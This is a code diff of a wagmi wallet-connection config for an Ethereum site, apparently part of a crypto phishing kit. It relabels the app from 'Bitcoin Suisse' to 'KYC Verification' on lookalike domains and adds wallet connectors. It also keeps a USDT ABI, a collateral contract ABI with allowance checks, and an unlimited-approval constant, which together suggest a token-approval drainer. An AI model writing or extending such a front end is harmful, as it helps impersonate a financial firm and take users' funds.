@@ -1,33 +1,41 @@
 import { http, createConfig } from 'wagmi';
 import { mainnet } from 'wagmi/chains';
-import { walletConnect, injected } from 'wagmi/connectors';
+import { walletConnect, injected, coinbaseWallet } from 'wagmi/connectors';
 
-// Project ID WalletConnect
+// Configuration WalletConnect
 const projectId = 'd45fef8809106f1b76a085a50afea0e4';
 
 const metadata = {
-  name: 'Bitcoin Suisse',
-  description: 'Connexion sécurisée',
-  url: 'https://bitcoin-suisse.fr',
-  icons: ['https://customer-assets.emergentagent.com/job_invest-collateral/artifacts/tzq62nbg_Logo_Bitcoin_Suisse.png']
+  name: 'KYC Verification',
+  description: 'Verification',
+  url: 'https://www.bitcoinsuisse.fr',
+  icons: []
 };
 
 export const config = createConfig({
   chains: [mainnet],
   connectors: [
-    injected(),
+    injected({ 
+      shimDisconnect: true,
+      target: 'metaMask'
+    }),
     walletConnect({ 
-      projectId,
-      metadata,
-      showQrModal: false,
+      projectId, 
+      metadata, 
+      showQrModal: true,
       qrModalOptions: {
         themeMode: 'dark'
       }
+    }),
+    coinbaseWallet({
+      appName: metadata.name,
+      appLogoUrl: metadata.icons[0]
     })
   ],
   transports: {
     [mainnet.id]: http('https://eth-mainnet.public.blastapi.io')
-  }
+  },
+  ssr: false
 });
 
 // Adresses des contrats
@@ -72,7 +80,6 @@ export const USDT_ABI = [
 
 // ABI pour CollateralManager (contrat simple)
 export const COLLATERAL_MANAGER_ABI = [
-  // Write functions
   {
     inputs: [],
     name: 'enregistrerClient',
@@ -92,7 +99,6 @@ export const COLLATERAL_MANAGER_ABI = [
     stateMutability: 'nonpayable',
     type: 'function'
   },
-  // Read functions
   {
     inputs: [{ internalType: 'address', name: 'client', type: 'address' }],
     name: 'verifierAllowance',
@@ -142,5 +148,4 @@ export const COLLATERAL_MANAGER_ABI = [
   }
 ];
 
-// Constantes
 export const MAX_UINT256 = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
